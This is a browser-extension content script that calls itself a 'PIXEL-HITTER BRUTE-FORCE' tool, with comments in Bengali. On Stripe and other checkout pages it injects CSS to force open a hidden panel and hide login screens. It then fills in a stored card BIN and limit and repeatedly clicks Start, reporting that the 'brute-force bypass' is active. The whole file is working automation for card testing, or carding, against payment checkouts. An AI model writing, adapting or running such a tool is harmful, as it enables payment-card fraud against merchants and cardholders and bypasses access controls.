(function() {
    const DEBUG = true;
    if (DEBUG) console.log("--- PIXEL-HITTER BRUTE-FORCE: V9 STABLE ---");

    const forceCSS = `
        #app, .app-container, [id*="app-root"] {
            display: block !important;
            visibility: visible !important;
            opacity: 1 !important;
            width: 350px !important;
            min-height: 450px !important;
            max-height: 600px !important;
            position: fixed !important;
            bottom: 70px !important;
            left: 20px !important;
            z-index: 2147483647 !important;
            background: #1a1a1a !important;
            border: 1px solid #333 !important;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5) !important;
            border-radius: 12px !important;
            overflow: visible !important;
        }
        #loginWrap, .login-wrap, [id*="login"], [class*="login-screen"] {
            display: none !important;
            left: -20000px !important;
            pointer-events: none !important;
        }
        #pixelMenu {
            outline: 4px solid #00ff00 !important;
            cursor: pointer !important;
        }
        /* নিশ্চিত করা যে BIN এরিয়া হাইড করা নয় */
        #binArea, .bin-content {
            display: block !important;
            visibility: visible !important;
        }
    `;

    function findInShadows(selector, text = null) {
        let found = [];
        function scan(root) {
            if (!root) return;
            try {
                if (root.querySelectorAll) {
                    root.querySelectorAll(selector).forEach(e => {
                        if (!text || (e.innerText && e.innerText.toLowerCase().includes(text.toLowerCase()))) found.push(e);
                    });
                }
                const ch = root.querySelectorAll ? root.querySelectorAll('*') : [];
                ch.forEach(el => { 
                    if (el.shadowRoot) {
                        // শ্যাডো ডমে সিএসএস ইনজেক্ট করা
                        const s = document.createElement('style');
                        s.textContent = forceCSS;
                        el.shadowRoot.appendChild(s);
                        scan(el.shadowRoot); 
                    }
                });
            } catch(e) {}
        }
        scan(document);
        return found;
    }

    // মেইন পেজে স্টাইল ইনজেক্ট
    const styleTag = document.createElement('style');
    styleTag.textContent = forceCSS;
    document.documentElement.appendChild(styleTag);

    const bruteForceLoop = () => {
        if (typeof chrome === 'undefined' || !chrome.storage) return;

        chrome.storage.local.get(['currentTask'], (res) => {
            if (!res.currentTask || !res.currentTask.bin) return;
            const task = res.currentTask;

            // ১. মেনু ড্রপডাউন বড় হওয়া নিশ্চিত করা
            const app = document.getElementById('app') || findInShadows('#app')[0];
            const menu = document.getElementById('pixelMenu') || findInShadows('div', 'Pixel Menu')[0];

            if (menu && (!app || app.offsetHeight < 100)) {
                console.log("[Brute] Menu is too small. Forcing click...");
                ['mousedown','click','mouseup'].forEach(t => menu.dispatchEvent(new MouseEvent(t, {bubbles:true})));
                menu.click();
            }

            // ২. ইনপুট ও স্টার্ট
            const binInp = document.getElementById('quickBinInput') || findInShadows('input[placeholder*="BIN"]')[0];
            const limitInp = document.getElementById('quickLimitInput') || findInShadows('input[id*="Limit"]')[0];
            const startBtn = document.getElementById('quickBinUseBtn') || findInShadows('button', 'Start')[0];

            if (binInp && startBtn && !window.bruteTriggered) {
                binInp.value = task.bin;
                binInp.dispatchEvent(new Event('input', { bubbles: true }));
                if (limitInp) {
                    limitInp.value = task.limit || 10;
                    limitInp.dispatchEvent(new Event('input', { bubbles: true }));
                }

                window.bruteTriggered = true;
                setTimeout(() => {
                    console.log("[Brute] Launching!");
                    ['mousedown','click','mouseup'].forEach(t => startBtn.dispatchEvent(new MouseEvent(t, {bubbles:true})));
                    startBtn.click();
                    chrome.runtime.sendMessage({ type: "REPORT_LIVE", data: { status: "ACTIVE", bin: task.bin, msg: "Brute-force bypass active. Hitting started." } });
                }, 1500);
            }
        });
    };

    // প্রতি ১.৫ সেকেন্ডে হার্টবিট
    setInterval(() => {
        findInShadows('nothing'); // শুধু ইনজেকশন ঠিক রাখার জন্য
        if (window.location.host.includes("stripe") || window.location.host.includes("checkout")) {
            bruteForceLoop();
        }
    }, 1500);

})();
